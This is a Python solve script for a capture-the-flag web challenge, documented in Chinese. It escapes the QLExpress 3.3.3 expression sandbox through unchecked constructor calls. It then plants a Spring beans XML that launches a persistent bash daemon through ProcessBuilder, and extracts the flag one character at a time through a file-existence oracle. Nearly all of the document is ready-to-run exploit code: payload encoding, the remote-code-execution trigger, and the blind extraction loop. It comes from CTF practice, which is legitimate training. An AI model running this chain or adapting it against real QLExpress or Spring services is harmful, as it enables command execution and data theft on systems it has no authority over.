#!/usr/bin/env python3
"""QL_again (WEB-02) — QLExpress 3.3.3 沙箱逃逸（构造器侧）→ Spring RCE → 离线 oracle 盲提 flag。

用法:  python3 solve.py http://TARGET:PORT [flag命令] [flag前缀] [字符集]
       flag命令默认 /readflag；前缀默认 DASCTF{；字符集默认 0-9a-fA-F 加 -_}。

原理：
  - GET /execute?payload=<b64>：payload 解码后落盘 /tmp/<b64前3字符>.txt 并交 QLExpress
    执行，仅成功时删文件，响应只有 success/error（天然 1-bit 信道）。
  - secureMethods={null} 封死所有方法调用，但 new 构造器不检查：
      1. 种 Spring beans XML（内容以 "<?x" 开头 → base64 前 3 字符 PD9 → 落
         /tmp/PD9.txt；XML 非法 QL → error → 文件留存）；
      2. new FileSystemXmlApplicationContext("file:///tmp/PD9.txt") 让 Spring 跑完整
         bean 生命周期，ProcessBuilder init-method=start 起 bash daemon（RCE）。
         注意：裸路径 "/tmp/..." 会被 Spring 的 getResourceByPath 剥掉首斜杠当成
         相对 VM 工作目录的路径，必须 file:// 前缀（或 // 双写斜杠）。
  - daemon 轮询执行 /tmp/IyE.txt（驱动脚本以 "#!/bin/bash" 开头 → base64 前 3 字符
    IyE），脚本末行 rm -f "$0" 自删作为「已消费」信号。
  - oracle 一律走构造器：new java.io.FileInputStream(path) —— 文件不存在则构造器抛
    异常 → error，存在 → success。两路 oracle：/tmp/MK（候选命中标记）、
    /tmp/IyE.txt（daemon 消费进度）。
  - 逐字符前缀匹配盲提：每个探测脚本先清 MK 再按前缀条件建 MK，且仅在确认脚本
    已被消费后才读 oracle —— 标记不可能串轮，两阶段防伪由此保证。
"""
import base64
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

CONTEXT = "/tmp/PD9.txt"   # "<?xml" → base64 前 3 字符 PD9
DRIVER = "/tmp/IyE.txt"    # "#!/bin/bash" → base64 前 3 字符 IyE
MARK = "/tmp/MK"

DAEMON_XML = f"""<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="d" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>bash</value>
        <value>-c</value>
        <value>while :; do if [ -f {DRIVER} ]; then bash {DRIVER}; fi; sleep 0.15; done</value>
      </list>
    </constructor-arg>
  </bean>
</beans>
"""


def execute(base: str, payload: str) -> bool:
    url = f"{base}/execute?payload={urllib.parse.quote(payload, safe='')}"
    try:
        with urllib.request.urlopen(url, timeout=15) as r:
            body = r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
    except (urllib.error.URLError, OSError):
        return False  # 网络抖动按 error 处理，交给上层轮询重试
    return "success" in body.lower()


def b64(text: str) -> str:
    return base64.b64encode(text.encode()).decode()


def ql_file_exists(base: str, path: str) -> bool:
    return execute(base, b64(f'new java.io.FileInputStream("{path}")'))


def plant(base: str, script: str):
    """种驱动脚本：#!/bin/bash 开头保证落盘 /tmp/IyE.txt；bash 脚本非 QL 表达式
    → error → 文件留存，等 daemon 消费。"""
    execute(base, b64(f"#!/bin/bash\n{script}\n"))


def wait_consumed(base: str, timeout: float = 8) -> bool:
    """等 daemon 吃掉当前驱动脚本（脚本自删 → /tmp/IyE.txt 消失）。"""
    deadline = time.time() + timeout
    while time.time() < deadline:
        if not ql_file_exists(base, DRIVER):
            return True
        time.sleep(0.3)
    return False


def main():
    base = sys.argv[1].rstrip("/")
    flagcmd = sys.argv[2] if len(sys.argv) > 2 else "/readflag"
    prefix = sys.argv[3] if len(sys.argv) > 3 else "DASCTF{"
    charset = sys.argv[4] if len(sys.argv) > 4 else "0123456789abcdefABCDEF-_}"

    # 1) 种 daemon beans XML 并触发加载（一次性；重复跑会多起一个 daemon，幂等无害）
    print("[*] planting daemon beans ...")
    execute(base, b64(DAEMON_XML))
    trig = ('new org.springframework.context.support.'
            f'FileSystemXmlApplicationContext("file://{CONTEXT}")')
    ok = execute(base, b64(trig))
    print("[*] daemon trigger ->", "success" if ok else "error")
    if not ok:
        return 1
    time.sleep(1.0)

    # 2) daemon 自检：种一个「建标记」脚本，确认能消费、oracle 能读到
    plant(base, f': > {MARK}; rm -f "$0"')
    if not (wait_consumed(base) and ql_file_exists(base, MARK)):
        print("[-] daemon 自检失败（脚本未被消费或未建标记）——链路不通")
        return 1
    print("[*] daemon alive, oracle ok")

    # 3) 逐字符前缀盲提
    print("[*] known prefix:", prefix)
    for _ in range(128):
        hit = None
        for cand in charset:
            plant(base,
                  f'rm -f {MARK}; R=$({flagcmd} 2>/dev/null); '
                  f'if [[ "$R" == "{prefix}{cand}"* ]]; then : > {MARK}; fi; '
                  f'rm -f "$0"')
            if not wait_consumed(base):
                print("[-] daemon 无响应（驱动脚本未被消费）")
                return 1
            if ql_file_exists(base, MARK):
                hit = cand
                break
        if hit is None:
            print(f"[-] no candidate extends {prefix!r} —— 已到末尾，或需第 4 参扩充字符集")
            break
        prefix += hit
        print("[+]", prefix)
        if prefix.endswith("}"):
            break
    print("[+] FLAG :", prefix)
    return 0


if __name__ == "__main__":
    sys.exit(main())
